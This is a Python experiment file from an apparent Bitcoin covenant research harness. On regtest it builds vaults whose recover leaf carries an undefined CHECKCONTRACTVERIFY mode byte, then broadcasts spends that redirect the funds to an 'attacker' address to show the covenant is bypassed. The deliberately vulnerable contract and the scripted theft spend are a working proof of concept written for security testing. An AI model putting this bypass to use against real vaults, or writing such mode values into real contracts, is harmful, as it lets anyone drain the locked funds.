"""Experiment: CCV Mode Bypass — Full Vault UTXO Theft via OP_SUCCESS

Escalates the synthetic mode-confusion finding (exp_ccv_edge_cases) to a
production-shaped vault.  Constructs a Vault with the SAME taptree as the
real pymatt Vault (trigger + recover leaves), but the recover leaf uses
an attacker-supplied CCV mode value instead of the correct 0.

When the mode is undefined (value >= 4, i.e. bits beyond 0-1 set), the interpreter treats
the entire script as OP_SUCCESS — unconditional acceptance, zero covenant
checks.  The attacker can spend the vault UTXO to arbitrary outputs with
no signature, no amount validation, nothing.

This is the CCVWildSpend transition: vault UTXO consumed with zero typed
outputs, funds vanish into untyped attacker-controlled UTXOs.

=== Experiment Design ===
Phase 1 (Control): Construct a correct Vault (mode=0 on recover).
  Attempt a mutated recover spend redirecting funds to attacker address.
  Expected: REJECTED — covenant enforces output script.

Phase 2 (Bypass sweep): For each undefined mode in {4, 7, 128, 255}:
  Construct a VulnerableVault identical to the real Vault but with the
  test mode on the recover leaf.  Fund it.  Attempt the same mutated spend.
  Expected: ACCEPTED — OP_SUCCESS bypasses all checks.

Phase 3 (Summary): Report pass/fail counts and severity assessment.

=== Prior Art ===
OP_SUCCESS for undefined CCV flags is specified in BIP-443 and documented
in checkcontractverify.md (lines 75-76).  exp_ccv_edge_cases tests this
with a minimal single-leaf contract.  This experiment validates the finding
against a full vault taptree structure.
"""

import sys
from dataclasses import dataclass
from pathlib import Path

from adapters.base import VaultAdapter
from harness.metrics import ExperimentResult, TxMetrics
from harness.regtest_caveats import emit_regtest_caveats
from experiments.registry import register


# ── Constants ───────────────────────────────────────────────────────
VAULT_AMOUNT_SATS = 500_000
FEE_SATS = 1_000
SPEND_DELAY = 10

# Mode values to sweep.  0 is the control (valid), rest are undefined.
# BIP-443 defines CCV flags as a bitmask with two defined bits:
#   bit 0 (value 1): CCV_FLAG_CHECK_INPUT
#   bit 1 (value 2): CCV_FLAG_DEDUCT_OUTPUT_AMOUNT
# Valid flag values are all combinations of these two bits:
#    0 = default (check output, preserve amount)
#    1 = CCV_FLAG_CHECK_INPUT
#    2 = CCV_FLAG_DEDUCT_OUTPUT_AMOUNT
#    3 = CHECK_INPUT | DEDUCT_OUTPUT_AMOUNT (both flags composed)
# The sentinel value -1 means "skip CCV check entirely" (NOP).
# Any flag value with bits outside {0,1} set (i.e., value >= 4) is
# undefined and triggers OP_SUCCESS semantics for forward compatibility.
#
# MODE 3 VERIFICATION: Mode 3 (0b11) is the bitwise OR of the two defined
# flags (CHECK_INPUT=1 and DEDUCT_OUTPUT_AMOUNT=2).  It is a VALID mode
# because only bits 0 and 1 are set — both are defined bits.  Mode 3 does
# NOT trigger OP_SUCCESS.  This is confirmed by the BIP-443 specification:
# "if the flags has any bit set that's not defined [... OP_SUCCESS]."  Since
# bits 0 and 1 are both defined, mode 3 has no undefined bits and is valid.
# We test mode 3 separately below as a VALID_COMPOSED_MODE to verify it
# does NOT trigger bypass (confirming the bitmask boundary is at value 4).
CONTROL_MODE = 0
VALID_COMPOSED_MODE = 3  # CHECK_INPUT | DEDUCT_OUTPUT_AMOUNT — should behave as valid
BYPASS_MODES = [4, 7, 128, 255]


@register(
    name="ccv_mode_bypass",
    description="CCV mode bypass: full vault UTXO theft via OP_SUCCESS on production-shaped vault",
    tags=["ccv_only", "security", "critical"],
    required_covenants=["ccv"],
)
def run(adapter: VaultAdapter) -> ExperimentResult:
    result = ExperimentResult(
        experiment="ccv_mode_bypass",
        covenant=adapter.name,
        params={
            "vault_amount_sats": VAULT_AMOUNT_SATS,
            "fee_sats": FEE_SATS,
            "spend_delay": SPEND_DELAY,
            "control_mode": CONTROL_MODE,
            "valid_composed_mode": VALID_COMPOSED_MODE,
            "bypass_modes": BYPASS_MODES,
        },
    )

    if adapter.name != "ccv":
        result.observe("Skipping — CCV-specific experiment.")
        return result

    try:
        mods = _ensure_pymatt_imports()
        _run_bypass_experiment(adapter, result, mods)
    except Exception as e:
        result.error = str(e)
        result.observe(f"FAILED: {e}")
        import traceback
        result.observe(traceback.format_exc())

    emit_regtest_caveats(
        result,
        experiment_specific=(
            "OP_SUCCESS semantics are consensus behavior — if an undefined "
            "CCV flag triggers OP_SUCCESS on regtest, it will do the same "
            "on mainnet.  This experiment faithfully reproduces mainnet "
            "behavior because the finding is about script execution "
            "semantics, not economic dynamics."
        ),
    )

    return result


# ── pymatt lazy imports ─────────────────────────────────────────────

def _ensure_pymatt_imports():
    """Lazy-load pymatt modules needed for raw vault construction."""
    PYMATT_REPO = Path(__file__).resolve().parents[2] / "pymatt"
    paths = [str(PYMATT_REPO / "src"), str(PYMATT_REPO / "examples" / "vault")]
    for p in paths:
        if p not in sys.path:
            sys.path.insert(0, p)

    from matt import CCV_FLAG_DEDUCT_OUTPUT_AMOUNT, NUMS_KEY
    from matt.argtypes import BytesType, IntType, SignerType
    from matt.btctools import key
    from matt.btctools.messages import CTxOut
    from matt.btctools.script import (
        CScript, OP_CHECKCONTRACTVERIFY, OP_CHECKSIG,
        OP_CHECKTEMPLATEVERIFY, OP_DUP, OP_SWAP, OP_TRUE,
    )
    from matt.contracts import (
        ClauseOutput, ClauseOutputAmountBehaviour, ContractState,
        OpaqueP2TR, StandardAugmentedP2TR, StandardClause,
    )
    from matt.script_helpers import check_input_contract, older
    from matt.utils import addr_to_script

    return {
        "NUMS_KEY": NUMS_KEY,
        "CCV_FLAG_DEDUCT_OUTPUT_AMOUNT": CCV_FLAG_DEDUCT_OUTPUT_AMOUNT,
        "BytesType": BytesType,
        "IntType": IntType,
        "SignerType": SignerType,
        "key": key,
        "CTxOut": CTxOut,
        "CScript": CScript,
        "OP_CHECKCONTRACTVERIFY": OP_CHECKCONTRACTVERIFY,
        "OP_CHECKSIG": OP_CHECKSIG,
        "OP_CHECKTEMPLATEVERIFY": OP_CHECKTEMPLATEVERIFY,
        "OP_DUP": OP_DUP,
        "OP_SWAP": OP_SWAP,
        "OP_TRUE": OP_TRUE,
        "ClauseOutput": ClauseOutput,
        "ClauseOutputAmountBehaviour": ClauseOutputAmountBehaviour,
        "ContractState": ContractState,
        "OpaqueP2TR": OpaqueP2TR,
        "StandardAugmentedP2TR": StandardAugmentedP2TR,
        "StandardClause": StandardClause,
        "check_input_contract": check_input_contract,
        "older": older,
        "addr_to_script": addr_to_script,
    }


# ── Vulnerable vault construction ──────────────────────────────────

def _build_vulnerable_vault(mods, recover_mode: int, spend_delay: int,
                            recover_pk: bytes, unvault_pk: bytes):
    """Build a Vault with the same taptree as production, but recover leaf
    uses `recover_mode` instead of the correct 0.

    Taptree structure (mirrors vault_contracts.py Vault):
      [trigger, recover]
    where trigger uses mode=0 (always valid) and recover uses the test mode.

    The Unvaulting contract referenced by trigger is fully correct —
    only the Vault's own recover leaf is mutated.
    """
    CScript = mods["CScript"]
    OP_CCV = mods["OP_CHECKCONTRACTVERIFY"]
    OP_CHECKSIG = mods["OP_CHECKSIG"]
    OP_CTV = mods["OP_CHECKTEMPLATEVERIFY"]
    OP_DUP = mods["OP_DUP"]
    OP_SWAP = mods["OP_SWAP"]
    OP_TRUE = mods["OP_TRUE"]
    NUMS_KEY = mods["NUMS_KEY"]
    BytesType = mods["BytesType"]
    IntType = mods["IntType"]
    SignerType = mods["SignerType"]
    ClauseOutput = mods["ClauseOutput"]
    ContractState = mods["ContractState"]
    OpaqueP2TR = mods["OpaqueP2TR"]
    StandardAugmentedP2TR = mods["StandardAugmentedP2TR"]
    StandardClause = mods["StandardClause"]
    check_input_contract = mods["check_input_contract"]
    older = mods["older"]

    # ── Build the Unvaulting contract (fully correct) ───────────
    class _Unvaulting(StandardAugmentedP2TR):
        @dataclass
        class State(ContractState):
            ctv_hash: bytes
            def encode(self):
                return self.ctv_hash
            def encoder_script():
                return CScript([])

        def __init__(self):
            withdrawal = StandardClause(
                name="withdraw",
                script=CScript([
                    OP_DUP,
                    *check_input_contract(-1, None),
                    *older(spend_delay),
                    OP_CTV,
                ]),
                arg_specs=[("ctv_hash", BytesType())],
            )
            uv_recover = StandardClause(
                name="recover",
                script=CScript([
                    0, OP_SWAP, recover_pk, 0,
                    0,  # correct mode
                    OP_CCV, OP_TRUE,
                ]),
                arg_specs=[("out_i", IntType())],
                next_outputs_fn=lambda args, _: [
                    ClauseOutput(n=args["out_i"],
                                 next_contract=OpaqueP2TR(recover_pk))
                ],
            )
            super().__init__(NUMS_KEY, [withdrawal, uv_recover])

    unvaulting = _Unvaulting()

    # ── Build the Vault with configurable recover mode ──────────
    trigger = StandardClause(
        name="trigger",
        script=CScript([
            0,  # alternate_pk = None → use 0 (NUMS key internally)
            unvaulting.get_taptree_merkle_root(),
            0,  # mode = 0 (always valid)
            OP_CCV,
            unvault_pk,
            OP_CHECKSIG,
        ]),
        arg_specs=[
            ("sig", SignerType(unvault_pk)),
            ("ctv_hash", BytesType()),
            ("out_i", IntType()),
        ],
        next_outputs_fn=lambda args, _: [
            ClauseOutput(
                n=args["out_i"],
                next_contract=unvaulting,
                next_state=unvaulting.State(ctv_hash=args["ctv_hash"]),
            )
        ],
    )

    # THE VULNERABLE LEAF — recover_mode may be undefined
    recover = StandardClause(
        name="recover",
        script=CScript([
            0,           # data
            OP_SWAP,     # <out_i> from witness
            recover_pk,  # expected output pubkey
            0,           # taptree
            recover_mode,  # ← THE BUG: mode value under test
            OP_CCV,
            OP_TRUE,
        ]),
        arg_specs=[("out_i", IntType())],
        next_outputs_fn=lambda args, _: [
            ClauseOutput(n=args["out_i"],
                         next_contract=OpaqueP2TR(recover_pk))
        ],
    )

    # Same taptree structure as production: [trigger, recover]
    VulnerableVault = type(
        f"VulnerableVault_mode{recover_mode}",
        (StandardAugmentedP2TR,),
        {"State": None},
    )(NUMS_KEY, [trigger, recover])

    return VulnerableVault, unvaulting


# ── Experiment core ─────────────────────────────────────────────────

def _run_bypass_experiment(adapter, result, mods):
    """Run the full control + bypass sweep."""
    from dataclasses import dataclass

    manager = adapter._manager
    rpc = adapter._pymatt_rpc
    key_mod = mods["key"]
    CTxOut = mods["CTxOut"]
    addr_to_script = mods["addr_to_script"]

    # Generate key material
    recover_key = key_mod.ECKey()
    recover_key.generate(compressed=True)
    recover_pk = recover_key.get_pubkey().get_bytes()[1:]  # x-only

    unvault_key = key_mod.ECKey()
    unvault_key.generate(compressed=True)
    unvault_pk = unvault_key.get_pubkey().get_bytes()[1:]

    # ── Phase 1: Control (mode=0, should REJECT mutated spend) ──
    result.observe("=" * 60)
    result.observe("PHASE 1: Control — correct Vault (recover mode=0)")
    result.observe("=" * 60)

    control_accepted = _test_single_mode(
        mods, manager, rpc, result,
        mode=CONTROL_MODE,
        recover_pk=recover_pk,
        unvault_pk=unvault_pk,
        label="control",
    )

    if control_accepted:
        result.observe(
            "ANOMALY: Control vault (mode=0) accepted mutated spend! "
            "This invalidates the experiment — mode=0 should enforce covenants."
        )
        result.error = "Control case failed: mode=0 accepted mutated spend"
        return
    else:
        result.observe("PASS: Control vault correctly rejected mutated spend.")

    # ── Phase 1b: Mode 3 verification (valid composed mode) ───────
    result.observe("")
    result.observe("=" * 60)
    result.observe("PHASE 1b: Mode 3 — valid composed mode (CHECK_INPUT | DEDUCT)")
    result.observe("=" * 60)
    result.observe(
        "Mode 3 (0b11) sets bits 0 and 1, both of which are defined in BIP-443.  "
        "This should NOT trigger OP_SUCCESS — it is a valid composed flag."
    )

    mode3_accepted = _test_single_mode(
        mods, manager, rpc, result,
        mode=VALID_COMPOSED_MODE,
        recover_pk=recover_pk,
        unvault_pk=unvault_pk,
        label="mode3_valid",
    )

    if mode3_accepted:
        result.observe(
            "WARNING: Mode 3 accepted mutated spend!  This would mean mode 3 "
            "triggers OP_SUCCESS despite having only defined bits set.  "
            "Investigate: the BIP-443 bitmask boundary may differ from spec."
        )
    else:
        result.observe(
            "PASS: Mode 3 correctly rejected mutated spend.  Confirms the "
            "OP_SUCCESS boundary is at value >= 4 (any undefined bit set), "
            "not value >= 3.  The bitmask interpretation is verified."
        )

    # ── Phase 2: Bypass sweep ───────────────────────────────────
    result.observe("")
    result.observe("=" * 60)
    result.observe("PHASE 2: Bypass sweep — undefined modes on recover leaf")
    result.observe("=" * 60)

    bypass_accepted = 0
    bypass_rejected = 0

    for mode_val in BYPASS_MODES:
        result.observe(f"\n--- Mode {mode_val} ---")
        accepted = _test_single_mode(
            mods, manager, rpc, result,
            mode=mode_val,
            recover_pk=recover_pk,
            unvault_pk=unvault_pk,
            label=f"bypass_mode_{mode_val}",
        )
        if accepted:
            bypass_accepted += 1
        else:
            bypass_rejected += 1

    # ── Phase 3: Summary ────────────────────────────────────────
    result.observe("")
    result.observe("=" * 60)
    result.observe("PHASE 3: Summary")
    result.observe("=" * 60)
    result.observe(f"Control (mode=0): {'ACCEPTED' if control_accepted else 'REJECTED'}")
    result.observe(f"Mode 3 (valid composed): {'ACCEPTED' if mode3_accepted else 'REJECTED'}")
    result.observe(f"Bypass modes (≥4): {bypass_accepted} accepted, {bypass_rejected} rejected "
                   f"(out of {len(BYPASS_MODES)} tested)")

    if bypass_accepted == len(BYPASS_MODES) and not control_accepted and not mode3_accepted:
        result.observe(
            "CONFIRMED: All undefined modes trigger OP_SUCCESS on a "
            "production-shaped vault taptree. A single-byte encoding "
            "bug in the recover clause mode value causes COMPLETE "
            "covenant bypass — anyone can steal the vault balance."
        )
        result.observe(
            "METHODOLOGY NOTE: We use a structurally equivalent taptree "
            "(VulnerableVault) rather than the production pymatt Vault class "
            "because the production class does not expose undefined mode "
            "values — the vulnerability requires a developer to choose a "
            "mode byte outside {0,1,2,3}.  The VulnerableVault mirrors the "
            "production Vault's taptree layout ([trigger, recover]) with "
            "identical script structure; only the recover leaf's mode byte "
            "differs.  The OP_SUCCESS semantics are a property of the CCV "
            "interpreter, not the contract class, so the finding transfers "
            "to any contract using an undefined mode value."
        )
        result.observe(
            "CCVWildSpend transition: vault UTXO → zero typed outputs → "
            "funds into untyped attacker-controlled UTXOs.  No signature "
            "required, no output validation, no amount checking."
        )
    elif bypass_accepted > 0:
        result.observe(
            f"PARTIAL: {bypass_accepted}/{len(BYPASS_MODES)} undefined "
            f"modes triggered bypass.  {bypass_rejected} were unexpectedly "
            "rejected — investigate implementation."
        )
    else:
        result.observe(
            "UNEXPECTED: No undefined modes triggered bypass.  OP_SUCCESS "
            "semantics may not apply in this CCV implementation."
        )


def _test_single_mode(mods, manager, rpc, result, *, mode, recover_pk,
                       unvault_pk, label):
    """Test one mode value.  Returns True if mutated spend was accepted."""
    CTxOut = mods["CTxOut"]
    addr_to_script = mods["addr_to_script"]

    # Build vault with this mode on the recover leaf
    vault_contract, _ = _build_vulnerable_vault(
        mods, recover_mode=mode, spend_delay=SPEND_DELAY,
        recover_pk=recover_pk, unvault_pk=unvault_pk,
    )

    # Fund the vault
    instance = manager.fund_instance(vault_contract, VAULT_AMOUNT_SATS)
    result.observe(f"  Funded vault: {VAULT_AMOUNT_SATS} sats (recover mode={mode})")

    # Build a legitimate recover spend, then MUTATE the output
    spend_tx, _ = manager.get_spend_tx(
        (instance, "recover", {"out_i": 0})
    )
    spend_tx.wit.vtxinwit = [
        manager.get_spend_wit(instance, "recover", {"out_i": 0})
    ]

    # MUTATION: redirect output to attacker-controlled address
    attacker_addr = rpc.getnewaddress(f"attacker-mode-{mode}")
    spend_tx.vout[0] = CTxOut(
        VAULT_AMOUNT_SATS - FEE_SATS,
        addr_to_script(attacker_addr),
    )

    spend_hex = spend_tx.serialize().hex()

    try:
        txid = rpc.sendrawtransaction(spend_hex)
        # Mine to confirm
        mine_addr = rpc.getnewaddress()
        rpc.generatetoaddress(1, mine_addr)

        # Verify theft
        tx_info = rpc.getrawtransaction(txid, True)
        actual_addr = tx_info["vout"][0]["scriptPubKey"].get("address", "")
        theft_confirmed = (actual_addr == attacker_addr)

        result.observe(f"  ACCEPTED (txid: {txid[:16]}...)")
        if theft_confirmed:
            result.observe(f"  THEFT CONFIRMED: funds redirected to attacker")
        result.observe(f"  vsize={tx_info.get('vsize', 'N/A')}, "
                       f"weight={tx_info.get('weight', 'N/A')}")

        # Record metrics
        result.add_tx(TxMetrics(
            label=f"{label}_accepted",
            txid=txid,
            vsize=tx_info.get("vsize", 0),
            weight=tx_info.get("weight", 0),
            amount_sats=VAULT_AMOUNT_SATS - FEE_SATS,
            num_inputs=len(tx_info.get("vin", [])),
            num_outputs=len(tx_info.get("vout", [])),
            script_type="p2tr_ccv_vault_bypass",
        ))
        return True

    except Exception as rpc_err:
        err_msg = str(rpc_err)
        result.observe(f"  REJECTED: {err_msg[:120]}")
        return False
